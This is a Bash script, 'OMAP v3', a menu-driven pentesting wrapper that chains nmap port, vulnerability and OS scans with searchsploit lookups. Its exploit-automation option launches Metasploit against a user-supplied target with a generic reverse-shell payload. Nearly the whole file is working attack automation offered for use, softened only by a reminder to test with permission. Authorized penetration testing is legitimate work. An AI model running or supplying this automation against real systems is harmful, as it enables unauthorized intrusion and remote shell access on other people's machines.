#!/bin/bash

# =========================================================
# OMAP - Outstanding Multi-purpose Automated Pentester v3
# by StGlz
# contact: natone@riseup.net
# visit my ws: https://www.stglz-ecke.digital
# =========================================================
# DESCRIPTION:
# OMAP is a stylish, modular pentesting tool designed for flexibility.
# Choose between simple scanning, exploit searching, OS detection,
# or full automated exploitation using Exploit-DB and Metasploit.
# Use it responsibly and ONLY on networks you own or have permission to test!
# =========================================================

# Colors for aesthetic
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
BLUE=$(tput setaf 4)
CYAN=$(tput setaf 6)
BOLD=$(tput bold)
RESET=$(tput sgr0)

# Loading animation
function loading_animation() {
    local message="$1"
    echo -ne "${CYAN}${BOLD}${message}${RESET}"
    for i in {1..3}; do
        echo -ne "."
        sleep 0.5
    done
    echo ""
}

# Fake progress bar
function fake_progress() {
    local message="$1"
    echo -e "${BLUE}${BOLD}${message}${RESET}"
    for i in $(seq 1 50); do
        echo -ne "${GREEN}#${RESET}"
        sleep 0.05
    done
    echo -e " ${CYAN}[DONE]${RESET}"
}

# Dependency check
function check_dependencies() {
    echo -e "${CYAN}Checking for required tools...${RESET}"
    for tool in nmap searchsploit msfconsole; do
        if ! command -v "$tool" &> /dev/null; then
            echo -e "${RED}Error: ${tool} is not installed. Please install it and try again.${RESET}"
            exit 1
        fi
    done
    echo -e "${GREEN}All tools are installed.${RESET}"
}

# Menu options
function show_menu() {
    echo -e "\n${CYAN}${BOLD}=== OMAP Menu ===${RESET}"
    echo -e "${GREEN}1. Network Scan (basic or detailed).${RESET}"
    echo -e "${GREEN}2. Scan + Exploit Search.${RESET}"
    echo -e "${GREEN}3. OS Detection.${RESET}"
    echo -e "${GREEN}4. Exploit Automation with Metasploit.${RESET}"
    echo -e "${CYAN}Enter your choice (1-4): ${RESET}"
    read CHOICE
}

# Network Scan
function network_scan() {
    echo -e "\n${CYAN}Choose scan type:${RESET}"
    echo -e "${GREEN}1. Quick Scan (common ports).${RESET}"
    echo -e "${GREEN}2. Full Scan (all ports).${RESET}"
    echo -ne "${CYAN}Select an option (1-2): ${RESET}"
    read SCAN_TYPE

    case $SCAN_TYPE in
    1)
        echo -e "${CYAN}Performing Quick Scan...${RESET}"
        nmap -F "$TARGET"
        ;;
    2)
        echo -e "${CYAN}Performing Full Scan...${RESET}"
        nmap -p- "$TARGET"
        ;;
    *)
        echo -e "${RED}Invalid option.${RESET}"
        ;;
    esac
}

# Scan + Exploit Search
function scan_exploit_search() {
    echo -e "\n${CYAN}Scanning for vulnerabilities on ${TARGET}...${RESET}"
    nmap --script vuln "$TARGET" -oN vuln_scan.txt

    echo -e "${GREEN}Scan complete. Searching for exploits...${RESET}"
    while read -r vuln; do
        echo -e "\n${BOLD}Possible exploits for: ${vuln}${RESET}"
        searchsploit "$vuln"
    done < <(grep "|_" vuln_scan.txt | cut -d '|' -f 2)
}

# OS Detection
function os_detection() {
    echo -e "\n${CYAN}Detecting Operating System on ${TARGET}...${RESET}"
    nmap -O "$TARGET"
}

# Exploit Automation
function exploit_automation() {
    echo -ne "${CYAN}Enter the Exploit-DB path for your target: ${RESET}"
    read EXPLOIT

    if [ -z "$EXPLOIT" ]; then
        echo -e "${RED}No exploit provided. Exiting...${RESET}"
        exit 1
    fi

    echo -e "${CYAN}Running Metasploit with exploit: ${EXPLOIT}${RESET}"
    msfconsole -q -x "use $EXPLOIT; set RHOSTS $TARGET; set PAYLOAD generic/shell_reverse_tcp; exploit"
}

# Main function
function main() {
    clear
    echo -e "${CYAN}${BOLD}=== Welcome to OMAP v3 - Pentesting Your Way ===${RESET}"
    echo -e "${GREEN}Modular, flexible, and stylish pentesting for all your needs.${RESET}"
    echo -e "${RED}Reminder: Only scan networks you own or have permission to test.${RESET}\n"

    # Ask for target IP
    echo -ne "${CYAN}Enter the target IP or range (e.g., 192.168.1.0/24): ${RESET}"
    read TARGET

    if [ -z "$TARGET" ]; then
        echo -e "${RED}No target provided. Exiting...${RESET}"
        exit 1
    fi

    # Show menu and execute selected option
    show_menu
    case $CHOICE in
    1)
        network_scan
        ;;
    2)
        scan_exploit_search
        ;;
    3)
        os_detection
        ;;
    4)
        exploit_automation
        ;;
    *)
        echo -e "${RED}Invalid option. Exiting...${RESET}"
        exit 1
        ;;
    esac
}

# Check dependencies and run the main program
check_dependencies
main
